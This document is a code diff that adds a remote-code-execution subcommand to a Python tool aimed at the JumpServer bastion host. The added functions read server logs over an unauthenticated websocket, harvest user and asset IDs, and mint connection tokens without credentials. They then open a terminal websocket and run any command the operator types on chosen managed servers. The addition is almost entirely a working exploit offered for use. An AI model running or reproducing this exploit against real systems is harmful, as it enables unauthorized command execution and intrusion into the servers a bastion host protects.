@@ -14,7 +14,9 @@ import gzip
 import io
 import json
 import os
+import re
 import sys
+import uuid
 import tarfile
 import tempfile
 import time
@@ -24,6 +26,7 @@ import asyncio
 import urllib3
 import logging
 import argparse
+import websockets
 from urllib.parse import urlparse
 
 # python3 -m pip install requests aiohttp beautifulsoup4
@@ -425,6 +428,147 @@ def dump_sessions(ctx):
     print()
 
 
+# The bellow is for 2021.1.15 RCE
+def make_tty_url(token):
+    tty_url = "/koko/ws/token/?target_id="
+    return "ws://" + base_url.replace("http://", '') + tty_url + token
+
+
+async def read_log(target):
+    logger.info("[*] Get server log, please wait...")
+    end_count = 0
+    recv_size = 0
+    # server return about 4096 bytes every time, so the log cut is not complete, we need to concatenate strings
+    log = ''
+    try:
+        async with websockets.connect(target) as client:
+            await client.send(json.dumps({"task": "/opt/jumpserver/logs/gunicorn"}))
+            while True:
+                ret = json.loads(await client.recv())
+                log += ret["message"]
+                print(f'\rreceiving: {len(log)/1024:.3f} KB', end='')
+                if len(ret["message"]) < 4000:
+                    end_count += 1
+                if end_count >= 3:
+                    print()
+                    logger.info("[*] Finish read logs")
+                    break
+    except asyncio.TimeoutError:
+        logger.error("[-] websocket connection timeout!")
+        exit(1)
+    # log will clean about every day and store it in /opt/jumpserver/logs/20xx-xx-xx
+    id_tuple_set = set(re.compile('/api/v1/perms/asset-permissions/user/validate/\?action_name=connect&asset_id=(.*?)&cache_policy=1&system_user_id=(.*?)&user_id=(.*?) ').findall(log))
+    if len(id_tuple_set) == 0:
+        logger.warning("[-] no target found.")
+        exit(1)
+    for id_tuple in id_tuple_set:
+        logger.info("[+] asset_id=" + id_tuple[0] + ", system_user_id=" + id_tuple[1] + ", user_id=" + id_tuple[2])
+    return id_tuple_set
+
+
+# 向服务器端发送认证后的消息
+async def send_msg(websocket, _text):
+    if _text == "exit":
+        print(f'you have enter "exit", goodbye')
+        await websocket.close(reason="user exit")
+        return False
+    await websocket.send(_text)
+    recv_text = await websocket.recv()
+    logger.debug(f"[*] {recv_text}")
+
+
+# 获取token
+def get_token(user, asset, system_user):
+    token_url = "/api/v1/authentication/connection-token/?user-only=Veraxy"
+    data = {"user": user, "asset": asset, "system_user": system_user}
+    token_target = base_url + token_url
+    res = requests.post(token_target, json=data)
+    token = res.json()["token"]
+    return token
+
+
+# 判断目标状态
+async def detection_target(token):
+    tty_url = make_tty_url(token)
+    async with websockets.connect(tty_url) as websocket:
+        recv_text = await websocket.recv()
+        res_ws = json.loads(recv_text)
+        inittext = json.dumps({"id": res_ws['id'], "type": "TERMINAL_INIT", "data": "{\"cols\":234,\"rows\":13 }"})
+        await send_msg(websocket, inittext)
+        uid4 = str(uuid.uuid4())
+        cmd_text = json.dumps({"id": res_ws['id'], "type": "TERMINAL_DATA", "data": "echo {}\r\n".format(uid4)})
+        await send_msg(websocket, cmd_text)
+        for i in range(10):
+            recv_text = await websocket.recv()
+            cmd_res = json.loads(recv_text).get('data', '')
+            if cmd_res.startswith(uid4):
+                return True
+        return False
+
+
+# 建立连接
+async def main_logic(cmd, tty_url):
+    async with websockets.connect(tty_url) as websocket:
+        recv_text = await websocket.recv()
+        recv_json = json.loads(recv_text)
+        print("<<< {}".format(recv_json['data']))
+        id = recv_json['id']
+        print("ws id: " + id)
+        print("init ws")
+        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":234,\"rows\":13 }"})
+        await send_msg(websocket, inittext)
+        print("###############")
+        print("exec command: ")
+        cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd + "\r\n"})
+        print(cmdtext)
+        await send_msg(websocket, cmdtext)
+        for i in range(10):
+            recv_text = await websocket.recv()
+            print(f"{recv_text}")
+        print('===========finish')
+
+
+def rce():
+    log_url = "/ws/ops/tasks/log/"
+    log_target = base_url.replace("https://", "wss://").replace("http://", "ws://") + log_url
+    logger.info("[*] log_target: %s" % (log_target,))
+
+    # 获取user、asset、system_user组成的目标集合
+    id_tuple_set = asyncio.get_event_loop().run_until_complete(read_log(log_target))
+    # 判断目标是否可用
+    logger.info("[*] Checking for target connectivity...")
+    active_result = []
+    for id_tuple in id_tuple_set:
+        token = get_token(id_tuple[2], id_tuple[0], id_tuple[1])
+        status = asyncio.get_event_loop().run_until_complete(
+            detection_target(token))
+        if status:
+            active_result.append(id_tuple)
+    logger.info("[+] [{}] targets can be connected".format(len(active_result)))
+    i = 1
+    for result in active_result:
+        print(
+            str(i) + ") " + "asset_id=" + result[0] + ", system_user_id=" + result[1] + ", user_id=" + result[2]
+        )
+        i += 1
+    print("Please select the target: ")
+    choice_target = int(input(">>> "))
+    if choice_target > len(active_result):
+        choice_target = int(input("Please reselect:"))
+    print("Your choice is %s" % choice_target)
+    cmd = input("Please enter the command to execute: ")
+    # 获取token
+    token = get_token(
+        active_result[choice_target - 1][2], active_result[choice_target - 1][0], active_result[choice_target - 1][1]
+    )
+    logger.info("[+] token: {}".format(token))
+    tty_url = make_tty_url(token)
+    # 建立tty连接
+    logger.info("[*] websocket target: {}".format(tty_url))
+    logger.info("[*] Start connection establishment")
+    asyncio.get_event_loop().run_until_complete(main_logic(cmd, tty_url))
+
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="")
     subparsers = parser.add_subparsers(title="", dest="subcommand", description="")
@@ -439,6 +583,9 @@ if __name__ == "__main__":
 
     dump_parser = subparsers.add_parser("dump", help="dump sessions")
     dump_parser.add_argument("--outpath", type=str, default="output", help="session file output path")
+
+    rce_parser = subparsers.add_parser("rce", help="dump sessions")
+    rce_parser.add_argument("--outpath", type=str, default="output", help="session file output path")
 
     args = parser.parse_args()
 
@@ -521,5 +668,7 @@ if __name__ == "__main__":
     elif args.subcommand == "dump":
         context = DumpContext(base_url, args.outpath)
         dump_sessions(context)
+    elif args.subcommand == "rce":
+        rce()
     else:
         parser.print_help()
